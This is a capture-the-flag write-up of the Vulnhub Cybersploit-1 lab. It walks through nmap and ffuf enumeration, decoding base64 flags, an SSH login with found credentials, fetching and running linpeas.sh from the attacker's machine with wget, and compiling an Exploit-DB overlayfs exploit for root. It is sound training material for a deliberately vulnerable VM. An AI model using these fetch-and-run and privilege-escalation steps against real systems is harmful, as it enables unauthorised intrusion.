---
title: Vulnhub - Cybersploit-1 | EN
author: batmanly
date: 2023-03-25 10:10:00 +3
categories: [Writeup, Vulnhub, Cybersploit]
tags: [web, writeup, encoding, base64, cybersploit-1, overlays, exploitdb]
render_with_liquid: false
---


# Information

## ROOM

-   **Name:** `Cybersploit-1`
-   **Profile:** [Cybersploit-1](https://www.vulnhub.com/entry/cybersploit-1,506/)
-   **Difficulty:** Easy
-   **Description**: THIS IS A MACHINE FOR COMPLETE BEGINNER , THERE ARE THREE FALGS AVAILABLE IN THIS VM. FROM THIS VMs YOU WILL LEARN ABOUT ENCODER-DECODER & EXPLOIT-DB.

# Write-up

## Overview

It’s a easy machine you can learn encoding/decoding and user exploit db exploits.

## Network enumeration

let's start finding ip address of the machine than we will enumeration port and services with Nmap.
```bash
sudo arp-scan -l -I vboxnet0
```

![[]](/assets/img/vulnhub/cybersploit/cybersploit-1/img.png)

### Port and service scan with Nmap:

after finding ip of our cybersploit-1 machine we can now start scanning network.
```bash
sudo nmap -sV -T4 -sS -v -Pn -p- 192.168.56.102 -sC -oN nmap3 
```
we found there is 2 port is open , let's enumerate web services and if there is a weakness we will exploit this vulnerabilities.
```
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 011bc8fe18712860846a9f303511663d (DSA)
|   2048 d95314a37f9951403f49efef7f8b35de (RSA)
|_  256 ef435bd0c0ebee3e76615c6dce15fe7e (ECDSA)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-title: Hello Pentester!
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.22 (Ubuntu)
MAC Address: 08:00:27:86:68:85 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

## Web enumeration
let's look website . when i looked website first page in the view-source i found a username , let's keep it for further usage.
```
view-source:http://192.168.56.102/
```
![[]](/assets/img/vulnhub/cybersploit/cybersploit-1/img_1.png)
after looking up  `robots.txt` i found a some kind of base64 encoded string , let's decode this.
```bash
echo -e 'R29vZCBXb3JrICEKRmxhZzE6IGN5YmVyc3Bsb2l0e3lvdXR1YmUuY29tL2MvY3liZXJzcGxvaXR9' | base64 -d
```
simple flag nothing interesting , i will scan directories with FFUF.
```
Good Work !
Flag1: cybersploit{youtube.com/c/cybersploit} 
```
I like use ffuf for finding any directories , let's scan for directories and files , or backups.

```bash
ffuf -w /home/batmanly/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://192.168.56.102/FUZZ -c -ic -e .txt,.php,.bak,.tar.gz
```

```
[Status: 200, Size: 2333, Words: 318, Lines: 51, Duration: 5ms]
    * FUZZ: index

[Status: 200, Size: 2333, Words: 318, Lines: 51, Duration: 6ms]
    * FUZZ: 

[Status: 200, Size: 79, Words: 2, Lines: 3, Duration: 0ms]
    * FUZZ: robots.txt

[Status: 200, Size: 79, Words: 2, Lines: 3, Duration: 9ms]
    * FUZZ: robots

[Status: 200, Size: 3757743, Words: 22955, Lines: 21776, Duration: 1ms]
    * FUZZ: hacker

[Status: 200, Size: 2333, Words: 318, Lines: 51, Duration: 1ms]
    * FUZZ: 

[Status: 403, Size: 295, Words: 21, Lines: 11, Duration: 12ms]
    * FUZZ: server-status

```

### SSH Login with founded username-password

after finding nothing with directory scanning , i wanted to try the flag we found and username we found in the website with ssh login and i successfully login with that credentials.

![[]](/assets/img/vulnhub/cybersploit/cybersploit-1/img_2.png)

## Privilege Escalation
Now it's time to escalate our privileges and get root shell .

it's good to look for home directory when you get access any machine, because of that i started investigation home directory i found flag2.txt , it's also encoded numbers , i will decode and see what's interesting there.

```bash
cat flag2.txt
```
![[]](/assets/img/vulnhub/cybersploit/cybersploit-1/img_3.png)

after decoding encoded string we found second flag , i guess it's also a password of any account , let's see.
![[]](/assets/img/vulnhub/cybersploit/cybersploit-1/img_4.png)
i tried the flag i found with root and cybersploit user , but i couldn't get access other user , let's search more.
```
cybersploit{https:t.me/cybersploit1}
```

i will upload Linpeas and use it too find a way to escalate privileges.
```bash
updog -p 8000
```

```bash
wget http://192.168.56.1:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

```

![[]](/assets/img/vulnhub/cybersploit/cybersploit-1/img_5.png)

after running linpeas we found overlays exploit , this machine is vulnerable to this vulnerability 
![[]](/assets/img/vulnhub/cybersploit/cybersploit-1/img_6.png)

### Exploiting overlays vulnerability

we can download exploit from here and move it to machine , then compile exploit and run. let's do it.

```
https://www.exploit-db.com/exploits/37292
```

i copy and paste the content of the exploit inside `x3.c` file and compile it as a exploit writer suggest and run. than we got root.
![[]](/assets/img/vulnhub/cybersploit/cybersploit-1/img_7.png)

compile exploit
```
gcc  x3.c -o ofs
./ofs
```

![[]](/assets/img/vulnhub/cybersploit/cybersploit-1/img_8.png)

![[]](/assets/img/vulnhub/cybersploit/cybersploit-1/root.gif)
Yep. Now we Got root. Thanks for reading until the end , if you have any feedback i will appreciate to get , knowing different ways to get root always good for me.